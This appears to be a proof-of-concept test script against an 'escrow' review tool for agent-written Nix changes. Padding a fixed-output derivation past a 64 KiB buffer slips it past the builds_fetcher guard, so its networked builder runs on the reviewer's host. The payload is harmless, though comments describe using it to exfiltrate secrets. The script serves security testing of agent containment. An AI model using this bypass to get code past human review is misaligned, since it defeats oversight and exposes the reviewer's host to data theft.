#!/bin/sh
# PoC: bypass closure.c's fixed-output-derivation (FOD) guard so an
# agent-written FOD gets BUILT at review/sign time. A FOD is the one kind of
# derivation Nix grants network access inside its sandbox, so building one the
# agent wrote is an exfiltration / SSRF channel from the reviewer's host.
#
# builds_fetcher() (src/closure.c) reads `nix derivation show <drv>` into a
# fixed 64 KiB buffer (OUT_MAX) and greps it for "outputHash"/"hashAlgo"/
# "hash:". If the agent pads the derivation (a ~70 KiB env attribute) the hash
# markers land past 64 KiB, the grep sees none, builds_fetcher returns "not a
# fetcher", and build() builds the FOD -> its builder runs on the review host.
#
# This PoC's FOD builder is harmless/offline (echo x > $out); a real one would
# curl a secret out. We prove the BYPASS two ways:
#   padded FOD   -> review does NOT refuse, and the FOD's store path appears
#                   (its builder executed during `escrow review`)
#   unpadded FOD -> review prints "refused: it would build fixed-output ..."
#
# usage: tests/escape/poc/closure-fod-pad-bypass.sh /abs/escrow /abs/policy
set -eu
escrow=${1:?usage: $0 /abs/escrow /abs/policy}
policy=${2:?usage: $0 /abs/escrow /abs/policy}
[ "$(id -u)" -ne 0 ] || { echo "run as non-root"; exit 0; }
[ "$(nix config show sandbox 2>/dev/null)" = true ] || { echo "needs nix sandbox=true"; exit 0; }
fodhash="sha256-c8s4WKaHqElMozIwUwFigvPa051Cz2LKTnndoqrH2aw=" # sha256 of "x\n", flat

tmp=$(mktemp -d)
trap 'chmod -R u+rwx "$tmp" 2>/dev/null; rm -rf "$tmp"' EXIT
cd "$tmp"
export ESCROW_STATE=$tmp/state ESCROW_ROLES=$tmp/roles
pub() { cut -d' ' -f1,2 "$1.pub"; }
for u in alice bob carol; do ssh-keygen -q -t ed25519 -N '' -C "$u" -f "$u"; done
{ echo "alice requester $(pub alice)"
  echo "bob reviewer $(pub bob)"
  echo "carol signer $(pub carol)"; } > roles

# A local path input exists only so the base flake has a flake.lock (closure.c
# skips a flake with no lock). No network.
mkdir dummyflake
echo '{ outputs = { self }: { x = 1; }; }' > dummyflake/flake.nix

# base workspace: benign flake + its lock.
mkdir ws
cat > ws/flake.nix <<EOF
{
  inputs.dummy.url = "path:$tmp/dummyflake";
  outputs = { self, dummy }: {
    nixosConfigurations.poc.config.system.build.toplevel =
      derivation { name = "benign-top"; system = "x86_64-linux";
        builder = "/bin/sh"; args = [ "-c" "echo benign > \$out" ]; };
  };
}
EOF
( cd ws && nix flake lock >/dev/null 2>&1 )

# $1 = pad repeat count (7000 -> ~70 KiB pad -> bypass; 1 -> no pad -> refused)
# $2 = unique fod name
run_case() {
  reps=$1 fodname=$2
  "$escrow" --role "$policy" --workspace ws --key alice --state state -- \
    /bin/sh -c "cat > flake.nix <<'NIXEOF'
{
  inputs.dummy.url = \"path:$tmp/dummyflake\";
  outputs = { self, dummy }: {
    nixosConfigurations.poc.config.system.build.toplevel =
      let fod = derivation {
        name = \"$fodname\";
        system = \"x86_64-linux\";
        builder = \"/bin/sh\";
        args = [ \"-c\" \"echo x > \\\$out\" ];
        outputHashMode = \"flat\";
        outputHashAlgo = \"sha256\";
        outputHash = \"$fodhash\";
        AAAA_pad = builtins.concatStringsSep \"\" (builtins.genList (i: \"AAAAAAAAAA\") $reps);
      };
      in derivation {
        name = \"evil-top\";
        system = \"x86_64-linux\";
        builder = \"/bin/sh\";
        args = [ \"-c\" \"cp \\\${fod} \\\$out\" ];
      };
  };
}
NIXEOF" >/dev/null 2>>agent.err
  "$escrow" list | tail -n1 | cut -d' ' -f1
}

echo "=================== CONTROL: unpadded FOD (guard should fire) ==========="
nm_ctl="escrow-fod-ctl-$$"
id=$(run_case 1 "$nm_ctl")
"$escrow" review "$id" > ctl.out 2>&1 || true
if grep -q "refused: it would build fixed-output derivation" ctl.out; then
  echo "ok: unpadded FOD was refused by builds_fetcher"
else
  echo "?? control did not refuse; review tail:"; grep -A1 "closure diff" ctl.out | tail -5
fi

echo "=================== ATTACK: padded FOD (guard bypassed) ================="
nm_evil="escrow-fod-exfil-$$"
if ls -d /nix/store/*"$nm_evil" >/dev/null 2>&1; then echo "stale artifact"; exit 1; fi
id=$(run_case 7000 "$nm_evil")
"$escrow" review "$id" > evil.out 2>&1 || true
refused=no; grep -q "refused: it would build fixed-output derivation" evil.out && refused=yes
built=no; ls -d /nix/store/*"$nm_evil" >/dev/null 2>&1 && built=yes
echo "  builds_fetcher refused it? $refused"
echo "  FOD builder executed during review (store path present)? $built"
if [ "$refused" = no ] && [ "$built" = yes ]; then
  echo
  echo "POPPED: the padded fixed-output derivation slipped past builds_fetcher"
  echo "        and its builder RAN during 'escrow review':"
  ls -d /nix/store/*"$nm_evil"
  echo "        A real builder here has network (FOD) = exfil from the review host."
  exit 0
fi
echo "not reproduced; review tail:"; tail -8 evil.out
exit 1
